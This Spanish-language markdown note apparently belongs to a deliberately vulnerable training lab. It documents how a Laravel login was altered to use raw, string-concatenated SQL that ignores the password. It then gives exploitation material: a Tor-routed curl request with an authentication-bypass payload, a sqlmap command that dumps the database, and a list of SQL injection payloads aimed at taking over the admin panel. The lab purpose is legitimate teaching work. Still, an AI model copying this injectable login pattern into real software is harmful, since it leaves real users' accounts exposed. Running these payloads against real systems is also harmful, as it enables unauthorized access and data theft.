# 02 - SQL Injection

**Responsable:** Keysi

## Archivo modificado
`app/Http/Requests/Auth/LoginRequest.php`

## Cambio realizado
Se reemplazó `Auth::attempt()` por una consulta SQL raw con concatenación directa de strings, permitiendo inyección SQL.

```php
// 🔥 VULNERABLE - Antes:
if (! Auth::attempt([$field => $login, 'password' => ...])) {

// 🔥 VULNERABLE - Después:
$sql = "SELECT * FROM users WHERE $field = '$login' LIMIT 1";
$user = DB::select($sql);
if (!empty($user)) {
    Auth::login(User::find($user[0]->id));
}
```

## Explotación

### Manual con curl (via Tor)
```bash
torsocks curl -X POST "http://192.168.18.31:8001/login" \
  -d "login=admin' OR '1'='1' --&password=x"
```

### Con sqlmap (via Tor)
```bash
torsocks sqlmap -u "http://192.168.18.31:8001/login" \
  --data="login=admin&password=test" \
  --batch --dump
```

### Payloads útiles
```
admin' OR '1'='1' --
admin' --
' OR 1=1 --
admin' UNION SELECT * FROM users --
```

## Resultado esperado
- Login exitoso como admin sin conocer la contraseña
- Acceso total al panel `/admin/dashboard`
